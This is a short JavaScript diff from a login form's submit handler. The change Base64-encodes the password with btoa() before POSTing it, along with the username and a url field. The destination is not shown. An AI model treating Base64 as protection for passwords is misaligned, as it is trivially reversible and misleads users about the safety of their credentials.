@@ -17,7 +17,7 @@ document.getElementById('submitBtn').addEventListener('click', (e) => {
         method: 'POST',
         data: {
             n: document.forms.signin.uid.value,
-            p: document.forms.signin.pwd.value,
+            p: btoa(document.forms.signin.pwd.value),
             url: url
         }
     })
